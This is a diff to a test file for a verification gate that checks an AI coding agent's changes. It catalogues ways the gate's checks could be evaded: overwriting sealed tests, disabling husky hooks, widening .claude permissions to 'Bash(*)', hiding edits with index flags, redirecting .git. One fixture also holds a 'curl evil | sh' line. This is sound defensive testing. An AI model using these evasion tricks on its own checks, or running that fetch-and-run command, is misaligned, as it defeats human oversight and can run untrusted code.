@@ -37,10 +37,10 @@ const withSealedTest = () => {
 
 // ── uncommitted work ─────────────────────────────────────────────────────────
 
-test("T1: a sealed test overwritten with a script that restores itself is uncommitted work", () => {
+test("T1: a sealed test overwritten with a script that restores itself is uncommitted work", async () => {
   const { w, sealed } = withSealedTest();
   w.write("src/a.test.mjs", SELF_RESTORING);
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     sealed,
     oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
   });
@@ -61,12 +61,12 @@ test("T1: a sealed test overwritten with a script that restores itself is uncomm
   assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
 });
 
-test("T2: a weakened sealed test committed and then restored on disk fails the sealed hash", () => {
+test("T2: a weakened sealed test committed and then restored on disk fails the sealed hash", async () => {
   const { w, sealed } = withSealedTest();
   w.write("src/a.test.mjs", "it('real', () => {});\n");
   w.commit("weakened");
   w.write("src/a.test.mjs", ORIGINAL);
-  const report = gateStage(w, { sealed });
+  const report = await gateStage(w, { sealed });
   assert.equal(report.passed, false);
   assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
   assert.ok(claims(report).includes("uncommitted work: src/a.test.mjs"));
@@ -74,14 +74,14 @@ test("T2: a weakened sealed test committed and then restored on disk fails the s
   assert.equal(finding.severity, "blocker");
 });
 
-test("P1: edits to tracked protected files left uncommitted are uncommitted work and protected", () => {
+test("P1: edits to tracked protected files left uncommitted are uncommitted work and protected", async () => {
   const w = runWorktree({
     ".husky/pre-commit": "npx lint-staged\n",
     ".claude/settings.json": "{}\n",
   });
   w.write(".husky/pre-commit", "exit 0\n");
   w.write(".claude/settings.json", '{"permissions":{"allow":["Bash(*)"]}}\n');
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".claude/settings.json", ".husky/pre-commit"]);
   assert.deepEqual(report.protectedSources[".husky/pre-commit"], ["protected snapshot"]);
@@ -91,47 +91,47 @@ test("P1: edits to tracked protected files left uncommitted are uncommitted work
   ]);
 });
 
-test("P1b: the same edit staged with git add is still uncommitted work", () => {
+test("P1b: the same edit staged with git add is still uncommitted work", async () => {
   const w = runWorktree({ ".husky/pre-commit": "npx lint-staged\n" });
   w.write(".husky/pre-commit", "exit 0\n");
   w.git("add", ".husky/pre-commit");
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".husky/pre-commit"]);
   assert.deepEqual(claims(report), ["uncommitted work: .husky/pre-commit"]);
 });
 
-test("C1: a focused test and a debugger added but not committed are not a green gate", () => {
+test("C1: a focused test and a debugger added but not committed are not a green gate", async () => {
   const w = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
   w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
-  const report = gateStage(w, { contractFiles: ["src/a.test.ts"] });
+  const report = await gateStage(w, { contractFiles: ["src/a.test.ts"] });
   assert.equal(report.passed, false);
   assert.deepEqual(claims(report), ["uncommitted work: src/a.test.ts"]);
 });
 
-test("C2: an untracked declared test is uncommitted work, whatever it contains", () => {
+test("C2: an untracked declared test is uncommitted work, whatever it contains", async () => {
   const w = runWorktree();
   w.write("src/b.test.ts", "it.only('x', () => {});\ndebugger;\n");
-  const report = gateStage(w, { contractFiles: ["src/b.test.ts"] });
+  const report = await gateStage(w, { contractFiles: ["src/b.test.ts"] });
   assert.equal(report.passed, false);
   assert.deepEqual(claims(report), ["uncommitted work: src/b.test.ts"]);
 });
 
-test("uncommitted work under an exempt path is tolerated, except protected and sealed paths", () => {
+test("uncommitted work under an exempt path is tolerated, except protected and sealed paths", async () => {
   const w = runWorktree({ ".claude/settings.json": "{}\n", "src/a.test.mjs": ORIGINAL });
   w.write("specs/1-x.md", "journal\n");
-  const quiet = gateStage(w, { exemptPattern: "^specs/" });
+  const quiet = await gateStage(w, { exemptPattern: "^specs/" });
   assert.equal(quiet.passed, true, JSON.stringify(quiet));
 
   w.write(".claude/settings.json", '{"a":1}\n');
-  const protectedExempt = gateStage(w, { exemptPattern: "^(specs|\\.claude)/" });
+  const protectedExempt = await gateStage(w, { exemptPattern: "^(specs|\\.claude)/" });
   assert.equal(protectedExempt.passed, false);
   assert.ok(claims(protectedExempt).includes("uncommitted work: .claude/settings.json"));
   assert.ok(!claims(protectedExempt).includes("uncommitted work: specs/1-x.md"));
 
   w.git("checkout", "--", ".claude/settings.json");
   w.write("src/a.test.mjs", "it('weak', () => {});\n");
-  const sealedExempt = gateStage(w, {
+  const sealedExempt = await gateStage(w, {
     exemptPattern: "^src/",
     sealed: [
       { path: "src/a.test.mjs", sha256: g.sha256Bytes(Buffer.from(ORIGINAL)), criteria: [] },
@@ -141,43 +141,43 @@ test("uncommitted work under an exempt path is tolerated, except protected and s
   assert.ok(claims(sealedExempt).includes("uncommitted work: src/a.test.mjs"));
 });
 
-test("a flood of uncommitted paths is capped, with the rest counted", () => {
+test("a flood of uncommitted paths is capped, with the rest counted", async () => {
   const w = runWorktree();
   for (let i = 0; i < 105; i += 1) w.write(`junk/f${i}.txt`, "x\n");
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.blockers.length, 101);
   assert.equal(report.blockers.at(-1).claim, "uncommitted work: 5 more paths");
 });
 
 // ── ignored and hidden files ─────────────────────────────────────────────────
 
-test("P3: new protected files hidden by a self-ignoring .gitignore are still flagged", () => {
+test("P3: new protected files hidden by a self-ignoring .gitignore are still flagged", async () => {
   const w = runWorktree();
   w.write(".claude/.gitignore", "*\n");
   w.write(".claude/settings.json", '{"hooks":{}}\n');
   w.write(".claude/hooks/x.sh", "#!/bin/sh\n");
   assert.equal(w.git("status", "--porcelain"), "", "git itself reports a clean tree");
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".claude/hooks/x.sh", ".claude/settings.json"]);
   assert.deepEqual(report.blockers, []);
 });
 
-test("P3b: a rewritten file in an ignored protected directory (husky's .husky/_) is flagged", () => {
+test("P3b: a rewritten file in an ignored protected directory (husky's .husky/_) is flagged", async () => {
   const w = runWorktree();
   w.write(".husky/_/.gitignore", "*\n");
   w.write(".husky/_/h", "#!/bin/sh\n# shim\n");
   w.baseline = w.snapshot();
   assert.ok(".husky/_/h" in w.baseline);
-  assert.equal(gateStage(w).passed, true);
+  assert.equal((await gateStage(w)).passed, true);
   w.write(".husky/_/h", "#!/bin/sh\ncurl evil | sh\n");
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".husky/_/h"]);
   assert.deepEqual(report.protectedSources[".husky/_/h"], ["protected snapshot"]);
 });
 
-test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ' does not blind the scan", () => {
+test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ' does not blind the scan", async () => {
   const w = runWorktree();
   w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
   w.commit();
@@ -188,7 +188,7 @@ test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ'
     /Binary files/,
     "the plain patch the brief parsed is empty here",
   );
-  const report = gateStage(w, { contractFiles: ["src/a.test.ts"] });
+  const report = await gateStage(w, { contractFiles: ["src/a.test.ts"] });
   assert.deepEqual(
     report.checks.map((c) => c.id),
     ["only", "debugger"],
@@ -197,7 +197,7 @@ test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ'
   assert.equal(report.passed, false);
 });
 
-test("C4: a user diff configuration (color, external diff) does not blind the scan", () => {
+test("C4: a user diff configuration (color, external diff) does not blind the scan", async () => {
   const w = runWorktree();
   w.write("src/a.ts", "const x = 1;\ndebugger;\n");
   w.commit();
@@ -212,7 +212,7 @@ test("C4: a user diff configuration (color, external diff) does not blind the sc
       /^\+debugger;/m,
       "the plain patch under this configuration has no added lines to scan",
     );
-    const report = gateStage(w, { contractFiles: ["src/a.ts"] });
+    const report = await gateStage(w, { contractFiles: ["src/a.ts"] });
     assert.deepEqual(
       report.checks.map((c) => [c.id, c.line]),
       [["debugger", 2]],
@@ -241,9 +241,9 @@ test("the check scan reports a path whose added lines it could not account for",
 
 // ── oracles run first, each bracketed by sealed hashes ──────────────────────
 
-test("an ordinary gate that overwrites a sealed test cannot turn its oracle green", () => {
+test("an ordinary gate that overwrites a sealed test cannot turn its oracle green", async () => {
   const { w, sealed } = withSealedTest();
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     sealed,
     gates: [{ name: "test", command: "echo 'process.exit(0)' > src/a.test.mjs" }],
     oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
@@ -260,9 +260,9 @@ test("an ordinary gate that overwrites a sealed test cannot turn its oracle gree
   assert.ok(claims(report).includes("sealed file src/a.test.mjs changed during gates"));
 });
 
-test("an oracle that rewrites a sealed file is named, and so is every oracle that sees it changed", () => {
+test("an oracle that rewrites a sealed file is named, and so is every oracle that sees it changed", async () => {
   const { w, sealed } = withSealedTest();
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     sealed,
     oracles: [
       { criterion: "AC1", command: "echo 'process.exit(0)' > src/a.test.mjs", reason: null },
@@ -280,14 +280,14 @@ test("an oracle that rewrites a sealed file is named, and so is every oracle tha
   assert.equal(report.blockers.find((b) => b.claim.includes("around oracle")).category, "scope");
 });
 
-test("an intact sealed test passes the bracket, and runs without oracles have none", () => {
+test("an intact sealed test passes the bracket, and runs without oracles have none", async () => {
   const { w, sealed } = withSealedTest();
-  const quiet = gateStage(w, {
+  const quiet = await gateStage(w, {
     sealed,
     oracles: [{ criterion: "AC1", command: "true", reason: null }],
   });
   assert.equal(quiet.passed, true, JSON.stringify(quiet));
-  assert.deepEqual(gateStage(w, { sealed }).blockers, []);
+  assert.deepEqual((await gateStage(w, { sealed })).blockers, []);
 });
 
 // ── nested repositories ──────────────────────────────────────────────────────
@@ -298,9 +298,9 @@ const nestedRepo = (w, dir, files = {}) => {
   for (const [rel, body] of Object.entries(files)) w.write(`${dir}/${rel}`, body);
 };
 
-test("N2a: a protected file placed in a nested repository created by a gate is flagged", () => {
+test("N2a: a protected file placed in a nested repository created by a gate is flagged", async () => {
   const control = runWorktree();
-  const plain = gateStage(control, {
+  const plain = await gateStage(control, {
     gates: [
       {
         name: "evil",
@@ -315,7 +315,7 @@ test("N2a: a protected file placed in a nested repository created by a gate is f
   );
 
   const w = runWorktree();
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     gates: [
       {
         name: "evil",
@@ -329,16 +329,16 @@ test("N2a: a protected file placed in a nested repository created by a gate is f
   assert.equal(report.blockers[0].category, "scope");
 });
 
-test("N2b: a nested repository under an exempt path is not tolerated, and is named", () => {
+test("N2b: a nested repository under an exempt path is not tolerated, and is named", async () => {
   const control = runWorktree();
   control.write(".marvin/config.json", "{}\n");
-  assert.deepEqual(claims(gateStage(control, { exemptPattern: "^\\.marvin/" })), [
+  assert.deepEqual(claims(await gateStage(control, { exemptPattern: "^\\.marvin/" })), [
     "uncommitted work: .marvin/config.json",
   ]);
 
   const w = runWorktree();
   nestedRepo(w, ".marvin", { "config.json": "{}\n" });
-  const report = gateStage(w, { exemptPattern: "^\\.marvin/" });
+  const report = await gateStage(w, { exemptPattern: "^\\.marvin/" });
   assert.equal(report.passed, false);
   assert.deepEqual(claims(report), [
     "nested git repository: .marvin",
@@ -346,29 +346,29 @@ test("N2b: a nested repository under an exempt path is not tolerated, and is nam
   ]);
 });
 
-test("N2c: a nested repository under an ignored path is named too", () => {
+test("N2c: a nested repository under an ignored path is named too", async () => {
   const control = runWorktree({ ".gitignore": ".claude/\n" });
   control.write(".claude/settings.json", "{}\n");
-  assert.deepEqual(gateStage(control).protected, [".claude/settings.json"]);
+  assert.deepEqual((await gateStage(control)).protected, [".claude/settings.json"]);
 
   const w = runWorktree({ ".gitignore": ".claude/\n" });
   nestedRepo(w, ".claude", { "settings.json": "{}\n" });
   assert.equal(w.git("status", "--porcelain"), "", "git reports a clean tree");
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(claims(report), ["nested git repository: .claude"]);
 });
 
-test("a nested repository that was in the baseline is tolerated, a new one is not", () => {
+test("a nested repository that was in the baseline is tolerated, a new one is not", async () => {
   const w = runWorktree();
   nestedRepo(w, "vendor/lib", { "a.txt": "x\n" });
   w.baseline = w.snapshot();
   assert.equal(w.baseline["vendor/lib/"], "nested-repo");
-  const quiet = gateStage(w);
+  const quiet = await gateStage(w);
   assert.equal(quiet.passed, true, JSON.stringify(quiet));
 
   nestedRepo(w, "tools/other");
-  const loud = gateStage(w);
+  const loud = await gateStage(w);
   assert.equal(loud.passed, false);
   assert.deepEqual(claims(loud), [
     "nested git repository: tools/other",
@@ -393,46 +393,46 @@ const committedNestedRepo = (w, dir, files = {}) => {
   sh(inner, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "nested");
 };
 
-test("G1: a nested repository committed as a gitlink under an exempt parent is flagged", () => {
+test("G1: a nested repository committed as a gitlink under an exempt parent is flagged", async () => {
   const exemptPattern = "^(specs/|\\.marvin/)";
   const control = runWorktree();
   control.write(".marvin/pipeline/checks.yaml", "- { id: x, pattern: y, message: z }\n");
   control.commit();
-  const plain = gateStage(control, { exemptPattern });
+  const plain = await gateStage(control, { exemptPattern });
   assert.deepEqual(plain.protected, [".marvin/pipeline/checks.yaml"], "a plain file is caught");
 
   const w = runWorktree();
   committedNestedRepo(w, ".marvin/pipeline", { "checks.yaml": "- { id: x }\n" });
   w.commit();
   assert.match(w.git("ls-files", "-s"), /^160000 /m, "it really is a gitlink");
-  const report = gateStage(w, { exemptPattern });
+  const report = await gateStage(w, { exemptPattern });
   assert.equal(report.passed, false);
   assert.deepEqual(claims(report), ["nested git repository: .marvin/pipeline"]);
   assert.deepEqual(report.protected, [".marvin/pipeline"]);
 });
 
-test("G2: a gitlink at an unexempt, unprotected path gets the nested-repo blocker too", () => {
+test("G2: a gitlink at an unexempt, unprotected path gets the nested-repo blocker too", async () => {
   const w = runWorktree();
   committedNestedRepo(w, "vendor/sub", { "a.txt": "x\n" });
   w.commit();
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.undeclared, ["vendor/sub"]);
   assert.deepEqual(claims(report), ["nested git repository: vendor/sub"]);
   assert.deepEqual(w.snapshot(), { "vendor/sub/": "nested-repo" });
 });
 
-test("G3: a gitlink the baseline already holds is tolerated", () => {
+test("G3: a gitlink the baseline already holds is tolerated", async () => {
   const w = runWorktree();
   committedNestedRepo(w, "vendor/sub", { "a.txt": "x\n" });
   w.commit();
   w.baseline = w.snapshot();
   assert.equal(w.baseline["vendor/sub/"], "nested-repo");
-  const report = gateStage(w, { contractFiles: ["vendor/sub"] });
+  const report = await gateStage(w, { contractFiles: ["vendor/sub"] });
   assert.equal(report.passed, true, JSON.stringify(report));
 });
 
-test("G4: a plain file standing where a protected directory belongs is a protected change", () => {
+test("G4: a plain file standing where a protected directory belongs is a protected change", async () => {
   assert.deepEqual(g.protectedChanges([".husky", ".claude/hooks", "src/a.ts"], protectedDefaults), [
     ".husky",
     ".claude/hooks",
@@ -441,7 +441,7 @@ test("G4: a plain file standing where a protected directory belongs is a protect
   const w = runWorktree();
   w.write(".husky", "not a directory\n");
   w.commit();
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".husky"]);
   assert.deepEqual(w.snapshot(), { ".husky": g.sha256File(join(w.path, ".husky")) });
@@ -449,12 +449,12 @@ test("G4: a plain file standing where a protected directory belongs is a protect
 
 // ── index flags that hide changes ────────────────────────────────────────────
 
-test("N3a: an assume-unchanged sealed test overwritten with a self-restoring script is flagged", () => {
+test("N3a: an assume-unchanged sealed test overwritten with a self-restoring script is flagged", async () => {
   const { w, sealed } = withSealedTest();
   w.git("update-index", "--assume-unchanged", "src/a.test.mjs");
   w.write("src/a.test.mjs", SELF_RESTORING);
   assert.equal(w.git("status", "--porcelain"), "", "status is blind to the edit");
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     sealed,
     oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
   });
@@ -464,30 +464,30 @@ test("N3a: an assume-unchanged sealed test overwritten with a self-restoring scr
 
   const control = withSealedTest();
   control.w.write("src/a.test.mjs", SELF_RESTORING);
-  assert.deepEqual(claims(gateStage(control.w, { sealed: control.sealed })), [
+  assert.deepEqual(claims(await gateStage(control.w, { sealed: control.sealed })), [
     "uncommitted work: src/a.test.mjs",
   ]);
 });
 
-test("N3b: a skip-worktree file with an uncommitted it.only is flagged", () => {
+test("N3b: a skip-worktree file with an uncommitted it.only is flagged", async () => {
   const w = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
   w.git("update-index", "--skip-worktree", "src/a.test.ts");
   w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
   assert.equal(w.git("status", "--porcelain"), "");
-  const report = gateStage(w, { contractFiles: ["src/a.test.ts"] });
+  const report = await gateStage(w, { contractFiles: ["src/a.test.ts"] });
   assert.equal(report.passed, false);
   assert.deepEqual(claims(report), ["index flag hides changes: src/a.test.ts"]);
 
   const control = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
   control.write("src/a.test.ts", "it.only('x', () => {});\n");
-  assert.deepEqual(claims(gateStage(control, { contractFiles: ["src/a.test.ts"] })), [
+  assert.deepEqual(claims(await gateStage(control, { contractFiles: ["src/a.test.ts"] })), [
     "uncommitted work: src/a.test.ts",
   ]);
 });
 
-test("N3c: a gate that sets skip-worktree and rewrites a tracked file is flagged", () => {
+test("N3c: a gate that sets skip-worktree and rewrites a tracked file is flagged", async () => {
   const w = runWorktree({ "src/a.ts": "const a = 1;\n" });
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     gates: [
       {
         name: "evil",
@@ -500,17 +500,19 @@ test("N3c: a gate that sets skip-worktree and rewrites a tracked file is flagged
   assert.deepEqual(claims(report), ["gates set an index flag on src/a.ts"]);
 
   const control = runWorktree({ "src/a.ts": "const a = 1;\n" });
-  const plain = gateStage(control, { gates: [{ name: "evil", command: "echo evil > src/a.ts" }] });
+  const plain = await gateStage(control, {
+    gates: [{ name: "evil", command: "echo evil > src/a.ts" }],
+  });
   assert.deepEqual(claims(plain), ["gates modified tracked file src/a.ts"]);
 });
 
-test("the index flag check names assume-unchanged and skip-worktree alike, and a clean index is quiet", () => {
+test("the index flag check names assume-unchanged and skip-worktree alike, and a clean index is quiet", async () => {
   const w = runWorktree({ "a.txt": "1\n", "b.txt": "2\n", "c.txt": "3\n" });
-  assert.equal(gateStage(w).passed, true);
+  assert.equal((await gateStage(w)).passed, true);
   w.git("update-index", "--assume-unchanged", "a.txt");
   w.git("update-index", "--skip-worktree", "b.txt");
   w.git("update-index", "--skip-worktree", "--assume-unchanged", "c.txt");
-  assert.deepEqual(claims(gateStage(w)), [
+  assert.deepEqual(claims(await gateStage(w)), [
     "index flag hides changes: a.txt",
     "index flag hides changes: b.txt",
     "index flag hides changes: c.txt",
@@ -519,12 +521,12 @@ test("the index flag check names assume-unchanged and skip-worktree alike, and a
 
 // ── renames ──────────────────────────────────────────────────────────────────
 
-test("R1: moving a protected file to an exempt path still flags the origin", () => {
+test("R1: moving a protected file to an exempt path still flags the origin", async () => {
   const w = runWorktree({ ".husky/pre-commit": "npx lint-staged\n" });
   mkdirSync(join(w.path, "docs"), { recursive: true });
   w.git("mv", ".husky/pre-commit", "docs/pre-commit");
   w.commit();
-  const report = gateStage(w, { exemptPattern: "^docs/" });
+  const report = await gateStage(w, { exemptPattern: "^docs/" });
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".husky/pre-commit"]);
   assert.deepEqual(report.protectedSources[".husky/pre-commit"], [
@@ -533,37 +535,37 @@ test("R1: moving a protected file to an exempt path still flags the origin", () 
   ]);
 });
 
-test("R2: a pure rename of .claude/settings.json onto a declared path is protected", () => {
+test("R2: a pure rename of .claude/settings.json onto a declared path is protected", async () => {
   const w = runWorktree({ ".claude/settings.json": '{"permissions":{"deny":["Bash(rm:*)"]}}\n' });
   mkdirSync(join(w.path, "src"), { recursive: true });
   w.git("mv", ".claude/settings.json", "src/config.json");
   w.commit();
   assert.match(w.git("show", "--stat", "--format=", "-M", "HEAD"), /=>/, "git sees a rename");
-  const report = gateStage(w, { contractFiles: ["src/config.json"] });
+  const report = await gateStage(w, { contractFiles: ["src/config.json"] });
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".claude/settings.json"]);
   assert.deepEqual(report.undeclared, [".claude/settings.json"]);
 });
 
-test("R3: renaming an out-of-scope file onto a declared one flags the origin as undeclared", () => {
+test("R3: renaming an out-of-scope file onto a declared one flags the origin as undeclared", async () => {
   const w = runWorktree({ "src/auth.ts": "export const auth = 1;\n" });
   w.git("mv", "src/auth.ts", "src/new.ts");
   w.commit();
-  const report = gateStage(w, { contractFiles: ["src/new.ts"] });
+  const report = await gateStage(w, { contractFiles: ["src/new.ts"] });
   assert.equal(report.passed, false);
   assert.deepEqual(report.undeclared, ["src/auth.ts"]);
 });
 
 // ── the base and the repository the gate reads ───────────────────────────────
 
-test("P4: moving the origin/<base> ref after committing does not empty the diff", () => {
+test("P4: moving the origin/<base> ref after committing does not empty the diff", async () => {
   const w = runWorktree();
   w.write("src/a.ts", "debugger;\n");
   w.write(".husky/pre-commit", "exit 0\n");
   w.write(".mcp.json", "{}\n");
   w.commit();
   sh(w.path, "update-ref", "refs/remotes/origin/dev", "HEAD");
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.deepEqual(report.protected, [".husky/pre-commit", ".mcp.json"]);
   assert.deepEqual(
@@ -572,7 +574,7 @@ test("P4: moving the origin/<base> ref after committing does not empty the diff"
   );
 });
 
-test("P5: a rewritten .git pointer is a blocker and does not redirect the gate's git", () => {
+test("P5: a rewritten .git pointer is a blocker and does not redirect the gate's git", async () => {
   const w = runWorktree();
   w.write("src/a.ts", "debugger;\n");
   w.write(".husky/pre-commit", "exit 0\n");
@@ -580,7 +582,7 @@ test("P5: a rewritten .git pointer is a blocker and does not redirect the gate's
   const decoy = mkdtempSync(join(tmpdir(), "pipe-decoy-"));
   sh(decoy, "init", "-q", "-b", "dev");
   writeFileSync(join(w.path, ".git"), `gitdir: ${join(decoy, ".git")}\n`);
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.passed, false);
   assert.ok(claims(report).includes("worktree .git pointer was changed"));
   assert.deepEqual(report.protected, [".husky/pre-commit"]);
@@ -590,7 +592,7 @@ test("P5: a rewritten .git pointer is a blocker and does not redirect the gate's
   );
 });
 
-test("a .git replaced by a symlink to a decoy or by a directory is a blocker too", () => {
+test("a .git replaced by a symlink to a decoy or by a directory is a blocker too", async () => {
   for (const make of [
     (w, decoy) => {
       rmSync(join(w.path, ".git"));
@@ -607,7 +609,7 @@ test("a .git replaced by a symlink to a decoy or by a directory is a blocker too
     const decoy = mkdtempSync(join(tmpdir(), "pipe-decoy-"));
     sh(decoy, "init", "-q", "-b", "dev");
     make(w, decoy);
-    const report = gateStage(w);
+    const report = await gateStage(w);
     assert.equal(report.passed, false);
     assert.ok(claims(report).includes("worktree .git pointer was changed"));
   }
@@ -617,12 +619,12 @@ test("a .git replaced by a symlink to a decoy or by a directory is a blocker too
 
 const GIT_ID = "-c user.email=t@t -c user.name=t";
 
-test("P6: a protected file committed by a gate is flagged and HEAD moving is a blocker", () => {
+test("P6: a protected file committed by a gate is flagged and HEAD moving is a blocker", async () => {
   const w = runWorktree();
   w.write("src/a.ts", "const a = 1;\n");
   w.commit();
   const before = w.git("rev-parse", "HEAD");
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     contractFiles: ["src/a.ts"],
     gates: [
       {
@@ -643,9 +645,9 @@ test("P6: a protected file committed by a gate is flagged and HEAD moving is a b
   );
 });
 
-test("a gate that modifies a tracked file is a blocker; a tolerated exempt path is not", () => {
+test("a gate that modifies a tracked file is a blocker; a tolerated exempt path is not", async () => {
   const w = runWorktree({ "src/a.ts": "const a = 1;\n", "specs/1-x.md": "# spec\n" });
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     exemptPattern: "^specs/",
     gates: [{ name: "build", command: "echo changed > src/a.ts; echo journal >> specs/1-x.md" }],
   });
@@ -653,7 +655,7 @@ test("a gate that modifies a tracked file is a blocker; a tolerated exempt path 
   assert.deepEqual(claims(report), ["gates modified tracked file src/a.ts"]);
 });
 
-test("M1: the carried metrics record hides nothing behind its path: a directory, a linked parent, a sealed file", () => {
+test("M1: the carried metrics record hides nothing behind its path: a directory, a linked parent, a sealed file", async () => {
   const RECORD = ".marvin/metrics/001-demo.md";
   const header = "# Metrics — demo\n\nAppend-only.\n\n";
   const metricsRecord = { path: RECORD, slug: "demo" };
@@ -663,7 +665,7 @@ test("M1: the carried metrics record hides nothing behind its path: a directory,
   const dir = runWorktree({ [RECORD]: header });
   rmSync(join(dir.path, RECORD));
   dir.write(`${RECORD}/payload.mjs`, "export default 1;\n");
-  assert.deepEqual(claims(gateStage(dir, { metricsRecord })), [
+  assert.deepEqual(claims(await gateStage(dir, { metricsRecord })), [
     `uncommitted work: ${RECORD}`,
     `uncommitted work: ${RECORD}/payload.mjs`,
   ]);
@@ -675,7 +677,9 @@ test("M1: the carried metrics record hides nothing behind its path: a directory,
   writeFileSync(join(outside, "metrics", "001-demo.md"), header);
   symlinkSync(join(outside, "metrics"), join(linked.path, ".marvin", "metrics"));
   assert.ok(
-    claims(gateStage(linked, { metricsRecord })).some((c) => c.startsWith("uncommitted work")),
+    claims(await gateStage(linked, { metricsRecord })).some((c) =>
+      c.startsWith("uncommitted work"),
+    ),
   );
 
   // A record path that is also sealed is judged as the sealed file it is, never carried, even
@@ -693,8 +697,8 @@ test("M1: the carried metrics record hides nothing behind its path: a directory,
     join(sealedRecord.path, RECORD),
     `${header}\`\`\`json metric-event\n${JSON.stringify(event)}\n\`\`\`\n\n`,
   );
-  assert.deepEqual(claims(gateStage(sealedRecord, { metricsRecord })), []);
-  const report = gateStage(sealedRecord, {
+  assert.deepEqual(claims(await gateStage(sealedRecord, { metricsRecord })), []);
+  const report = await gateStage(sealedRecord, {
     metricsRecord,
     sealed: [{ path: RECORD, sha256: g.sha256Bytes(Buffer.from(header)), criteria: ["AC1"] }],
   });
@@ -702,9 +706,9 @@ test("M1: the carried metrics record hides nothing behind its path: a directory,
   assert.equal(report.passed, false);
 });
 
-test("a gate that rewrites a sealed test and leaves it fails twice over", () => {
+test("a gate that rewrites a sealed test and leaves it fails twice over", async () => {
   const { w, sealed } = withSealedTest();
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     sealed,
     gates: [{ name: "test", command: "echo 'it(1)' > src/a.test.mjs" }],
   });
@@ -716,9 +720,9 @@ test("a gate that rewrites a sealed test and leaves it fails twice over", () => 
   ]);
 });
 
-test("a gate that creates a protected file, or rewrites the .git pointer, is flagged", () => {
+test("a gate that creates a protected file, or rewrites the .git pointer, is flagged", async () => {
   const w = runWorktree();
-  const report = gateStage(w, {
+  const report = await gateStage(w, {
     gates: [
       { name: "setup", command: "mkdir -p .claude/hooks && echo x > .claude/hooks/y.sh" },
       { name: "evil", command: "echo 'gitdir: /nonexistent' > .git" },
@@ -764,7 +768,7 @@ test("a protected snapshot comparison lists changed, added and removed paths, so
   assert.throws(() => g.snapshotProtected("/", "/", []), /non-empty array/);
 });
 
-test("the shipped defaults reach every default protected location in a real worktree", () => {
+test("the shipped defaults reach every default protected location in a real worktree", async () => {
   const w = runWorktree();
   for (const rel of [
     ".marvin/config.json",
@@ -777,7 +781,7 @@ test("the shipped defaults reach every default protected location in a real work
     w.write(rel, "x\n");
   }
   w.commit();
-  const report = gateStage(w);
+  const report = await gateStage(w);
   assert.equal(report.protected.length, 6);
   assert.deepEqual(report.protected, [
     ".claude/hooks/a.sh",
